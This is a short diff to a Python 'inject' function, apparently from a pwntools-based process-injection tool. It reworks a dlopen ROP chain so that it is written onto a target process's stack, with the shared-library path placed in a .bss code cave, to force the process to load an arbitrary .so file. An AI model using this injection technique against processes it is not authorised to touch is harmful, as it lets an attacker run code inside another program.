@@ -22,12 +22,15 @@ def inject(user_args):
     log.info(f"current rsp: {hex(syscall_info.rsp)}")
 
     bss_cave = exploit_utils.find_cave(cave_size=0x100)
-    dlopen_rop_chain = exploit_utils.dl_open_rop(address=bss_cave, so_path=user_args.so)
-    exploit_utils.write_memory(address=bss_cave, content=dlopen_rop_chain)
+    # dlopen_rop_chain = exploit_utils.dlopen_rop(address=bss_cave, so_path=user_args.so)
+    dlopen_rop_chain = exploit_utils.dlopen_rop(address=bss_cave, so_path=user_args.so)
+    exploit_utils.write_memory(address=bss_cave, content=user_args.so.encode())
+    exploit_utils.write_memory(address=syscall_info.rsp, content=dlopen_rop_chain)
 
-    pop_rsp_gadget = exploit_utils.find_gadget(gadget=asm("pop rsp; ret"), gadget_name="pop_rsp")
-    pop_rbp_gadget = exploit_utils.find_gadget(gadget=asm("pop rbp; ret"), gadget_name="pop_rbp")
-    exploit_utils.write_memory(address=syscall_info.rsp, content=p64(pop_rsp_gadget) + p64(bss_cave))
+
+    # pop_rsp_gadget = exploit_utils.find_gadget(gadget=asm("pop rsp; ret"), gadget_name="pop_rsp")
+    # pop_rbp_gadget = exploit_utils.find_gadget(gadget=asm("pop rbp; ret"), gadget_name="pop_rbp")
+    # exploit_utils.write_memory(address=syscall_info.rsp, content=p64(pop_rsp_gadget) + p64(bss_cave))
 
     target_process.interactive()
 
